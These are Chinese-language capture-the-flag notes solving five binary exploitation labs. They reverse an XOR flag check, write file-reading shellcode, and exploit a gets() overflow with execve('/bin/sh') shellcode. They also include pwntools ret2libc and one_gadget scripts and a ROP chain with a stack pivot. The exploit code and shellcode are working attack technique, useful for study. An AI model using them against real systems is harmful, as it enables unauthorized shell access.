#lab1

ida
d键设置变量类型db，*键设置数组长度0x30+1
f5:

```

unsigned int get_flag()
{
  int buf; // [esp+8h] [ebp-80h]
  int v2; // [esp+Ch] [ebp-7Ch]
  unsigned int i; // [esp+10h] [ebp-78h]
  int fd; // [esp+14h] [ebp-74h]
  char v5[49]; // [esp+19h] [ebp-6Fh]
  char v6[49]; // [esp+4Ah] [ebp-3Eh]
  unsigned int v7; // [esp+7Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  strcpy(v6, "Do_you_know_why_my_teammate_Orange_is_so_angry???");
  v5[0] = 7;
  v5[1] = 59;
  v5[2] = 25;
  v5[3] = 2;
  v5[4] = 11;
  v5[5] = 16;
  v5[6] = 61;
  v5[7] = 30;
  v5[8] = 9;
  v5[9] = 8;
  v5[10] = 18;
  v5[11] = 45;
  v5[12] = 40;
  v5[13] = 89;
  v5[14] = 10;
  v5[15] = 0;
  v5[16] = 30;
  v5[17] = 22;
  v5[18] = 0;
  v5[19] = 4;
  v5[20] = 85;
  v5[21] = 22;
  v5[22] = 8;
  v5[23] = 31;
  v5[24] = 7;
  v5[25] = 1;
  v5[26] = 9;
  v5[27] = 0;
  v5[28] = 126;
  v5[29] = 28;
  v5[30] = 62;
  v5[31] = 10;
  v5[32] = 30;
  v5[33] = 11;
  v5[34] = 107;
  v5[35] = 4;
  v5[36] = 66;
  v5[37] = 60;
  v5[38] = 44;
  v5[39] = 91;
  v5[40] = 49;
  v5[41] = 85;
  v5[42] = 2;
  v5[43] = 30;
  v5[44] = 33;
  v5[45] = 16;
  v5[46] = 76;
  v5[47] = 30;
  v5[48] = 66;
  fd = open("/dev/urandom", 0);
  read(fd, &buf, 4u);
  printf("Give me maigc :");
  __isoc99_scanf("%d", &v2);
  if ( buf == v2 )
  {
    for ( i = 0; i <= 0x30; ++i )
      putchar((char)(v5[i] ^ v6[i]));
  }
  return __readgsdword(0x14u) ^ v7;
}

```
#lab2

kali 2017.2 x64 添加32位支持

```
echo "deb http://mirrors.ustc.edu.cn/kali kali-rolling  main non-free contrib" > /etc/apt/sources.list

dpkg --add-architecture i386

apt-get update

apt-get install lib32z1 lib32ncurses5

```

orw=open,read,write
shellcode sc.asm:

```
        jmp file
open :
        pop ebx
        xor eax,eax
        mov al,5
        xor ecx,ecx
        int 0x80


        mov ebx,eax
        mov al,3
        mov ecx,esp
        mov dl,0x30
        int 0x80

        mov al,4
        mov bl,1
        mov dl,0x30
        int 0x80

        xor eax,eax
        inc eax
        int 0x80

file :
        call open
        db '/tmp/flag',0x0
```

工具[shellnoob](https://github.com/reyammer/shellnoob)

snoob --intel --from-asm sc.asm --to-bin

note:

默认ATT，所以加上--intel,汇编最后一句db...去掉，会报错。
使用cat sc.bin | disasm检查
最后的shellocde为open('sc.bin').read()+'/tmp/flag\x00'

#lab3
```
.text:080484CD ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:080484CD                 public main
.text:080484CD main            proc near               ; DATA XREF: _start+17↑o
.text:080484CD
.text:080484CD s               = byte ptr -14h
.text:080484CD argc            = dword ptr  8
.text:080484CD argv            = dword ptr  0Ch
.text:080484CD envp            = dword ptr  10h
.text:080484CD
.text:080484CD ; __unwind {
.text:080484CD                 push    ebp
.text:080484CE                 mov     ebp, esp
.text:080484D0                 and     esp, 0FFFFFFF0h
.text:080484D3                 sub     esp, 30h
.text:080484D6                 mov     eax, ds:stdout@@GLIBC_2_0
.text:080484DB                 mov     dword ptr [esp+0Ch], 0 ; n
.text:080484E3                 mov     dword ptr [esp+8], 2 ; modes
.text:080484EB                 mov     dword ptr [esp+4], 0 ; buf
.text:080484F3                 mov     [esp], eax      ; stream
.text:080484F6                 call    _setvbuf
.text:080484FB                 mov     dword ptr [esp], offset format ; "Name:"
.text:08048502                 call    _printf
.text:08048507                 mov     dword ptr [esp+8], 32h ; nbytes
.text:0804850F                 mov     dword ptr [esp+4], offset name ; buf
.text:08048517                 mov     dword ptr [esp], 0 ; fd
.text:0804851E                 call    _read
.text:08048523                 mov     dword ptr [esp], offset aTryYourBest ; "Try your best:"
.text:0804852A                 call    _printf
.text:0804852F                 lea     eax, [esp+30h+s]
.text:08048533                 mov     [esp], eax      ; s
.text:08048536                 call    _gets
.text:0804853B                 nop
.text:0804853C                 leave
.text:0804853D                 retn
.text:0804853D ; } // starts at 80484CD
.text:0804853D main            endp
```
gets溢出

and     esp, 0FFFFFFF0h

sub     esp, 30h

相当于sub esp,38h,所以padding的长度为ebp-(esp+30h-14h)=1Ch

在exploit-db上找了下shellcode:

https://www.exploit-db.com/exploits/41757/

https://www.exploit-db.com/exploits/41750/

```
x64(len=21):
shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
;================================================================================
; nasm -f elf64 ./shellcode.asm
; ld -o shellcode shellcode.o
; objdump -d ./shellcode
                mul esi
                push rax
                mov rdi, "/bin//sh"
                push rdi
                mov rdi, rsp
                mov al, 59
                syscall
;================================================================================

x86(len=21):
shellcode = "\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
;================================================================================
                xor ecx, ecx
                push 0bH
                pop eax
                cdq
                push edx
                push "//sh"
                push "/bin"
                mov ebx, esp
                int 80H
```
在测试中发现，push操作破环了shellcode自己。
使用https://www.exploit-db.com/exploits/37069/,删除冗余的3个字节，得到只有一个只有一个push操作的shellcode，长度为24:

```
shellcode="\x31\xc9\xf7\xe1\xb0\x0b\xeb\x03\x5b\xcd\x80\xe8\xf8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"
;================================================================================
     xor    ecx, ecx
     mul    ecx
     mov    al, 0xb
     jmp    jjj
   ccc:
     pop    ebx
     int    0x80
   jjj:
     call   ccc
     db  '/bin/sh',0x0
```
#lab4

方法一

```
    read_got=elf.got['read']
    ru(':')
    sl(str(read_got))
    ru('0x')
    read_real=int(ru('\n'),16)
    info(hex(read_real))
    libc_base=read_real-libc.symbols['read']
    info(hex(libc_base))
    system_real=libc_base+libc.symbols['system']
    sh=elf.search('sh\x00').next()
    info(hex(sh))
    ru(':')
    p='a'*0x38+p32(0xdeadc0de)+p32(system_real)+p32(0xdeadc0de)+p32(sh)
    sl(p)
    r.interactive()
```

方法二
使用[one_gadget](https://github.com/david942j/one_gadget)
gem install one_gadget

```
root@kali:~/LAB/lab4# one_gadget libc.so 
0x3aa19	execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5f7b5	execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5f7b6	execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
```

可惜都不能用???

```
    read_got=elf.got['read']
    ru(':')
    sl(str(read_got))
    ru('0x')
    read_real=int(ru('\n'),16)
    info(hex(read_real))
    libc_base=read_real-libc.symbols['read']
    info(hex(libc_base))
    #magic=0x3aa19
    #magic=0x5f7b7
    magic=0x5f7b6
    magic_real=libc_base+magic
    info(hex(magic_real))
    ru(':')
    p='a'*0x38+p32(0xdeadc0de)+p32(magic_real)
    sl(p)
    r.interactive()
```
# lab5
使用ROPgadget --binary simplerop --ropchain生成的ropchain长度为136
使用[ropper](https://github.com/sashs/Ropper)的长度为96，而且生成的py文件中有imaage_base方便修改

```
pip install ropper
ropper --file simplerop --chain execve
```

但是stack中间不够，使用leave ret进行栈迁移
leave = mov sb,bp;pop bp

```
    leave_ret=0x8048e6e
    ru(':')
    payload='a'*0x14+'a'*8+p32(elf.bss())+p32(elf.symbols['read'])+p32(leave_ret)+p32(0)+p32(elf.bss())+p32(0x100)
    info(len(payload))
    sl(payload)

    import ropchain
    sl('a'*4+ropchain.p)
    r.interactive()
```

